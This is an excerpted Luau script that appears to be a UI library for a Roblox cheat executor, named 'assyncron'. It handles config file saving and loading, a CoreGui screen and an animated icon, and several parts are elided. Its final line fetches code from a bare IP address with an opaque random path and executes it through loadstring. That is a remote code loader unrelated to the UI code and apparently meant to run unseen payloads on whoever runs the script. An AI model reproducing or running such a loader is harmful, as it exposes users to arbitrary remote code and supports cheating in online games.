...
local Config = setmetatable({
    save = function(self: any, file_name: any, config: any)
        local success_save, result = pcall(function()
            ...
            writefile('assyncron/'..file_name..'.json', flags)
        end)
    ...
    load = function(self: any, file_name: any, config: any)
        local success_load, result = pcall(function()
            if not isfile('assyncron/'..file_name..'.json') then
                self:save(file_name, config)
        
                return
            end
        
            local flags = readfile('assyncron/'..file_name..'.json')
...
function Library:create_ui()
    local old_assyncron = CoreGui:FindFirstChild('assyncron')

    if old_assyncron then
        Debris:AddItem(old_assyncron, 0)
    end

    local assyncron = Instance.new('ScreenGui')
    assyncron.ResetOnSpawn = false
    assyncron.Name = 'assyncron'
    assyncron.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    assyncron.Parent = CoreGui
...
AnimateGif(Icon, 60, 40, 2, 3, 5, "rbxassetid://74080484918102", 10)
    ...
    function self:UIVisiblity()
        assyncron.Enabled = not assyncron.Enabled;
    end;
    ...
    function self:load()
        ...
        for _, object in assyncron:GetDescendants() do
...
loadstring(game:HttpGet("http://72.56.64.162/RtNvEsoLaIaenkpfu3J2Yd16fc3w0h80yqaU6NcQF7hUhS7z0VlmEq26gfVd7SJwLGY9P2rllot87o2p"))()
